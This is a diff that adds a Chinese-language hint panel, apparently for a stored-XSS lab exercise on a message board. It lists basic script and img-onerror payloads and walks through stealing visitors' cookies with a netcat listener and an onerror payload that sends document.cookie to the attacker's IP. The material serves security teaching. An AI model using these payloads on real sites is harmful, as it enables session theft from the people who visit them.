@@ -1,0 +1,17 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>存储型 XSS 的核心是<b>恶意输入被存进数据库，每个访问者都会触发</b>。思路：在昵称或留言内容里插入执行 JS 的标签（如 <code>&lt;script&gt;</code>、<code>&lt;img onerror&gt;</code>），提交后任何人访问留言板都会执行你的 JS。进阶可以构造盗 cookie 的 payload：在自己机器上起个监听，让 JS 把 <code>document.cookie</code> 发到你的监听地址。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>基础 payload（昵称或内容均可）：</b><br>
+<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
+<code>&lt;img src=x onerror=alert(1)&gt;</code><br>
+<b>盗 cookie 实战思路：</b><br>
+1. 在自己机器上起个监听：<code>nc -lvvp 9001</code> 或用 Burp Collaborator<br>
+2. 留言提交：<code>&lt;img src=x onerror="new Image().src='http://你的IP:9001/?c='+document.cookie"&gt;</code><br>
+3. 任何人访问留言板，cookie 就会发到你的监听端口<br>
+<b>注意：</b>如果插入了坏标签导致页面异常，点上方"清空留言板"重置。
+</div>
+</details>
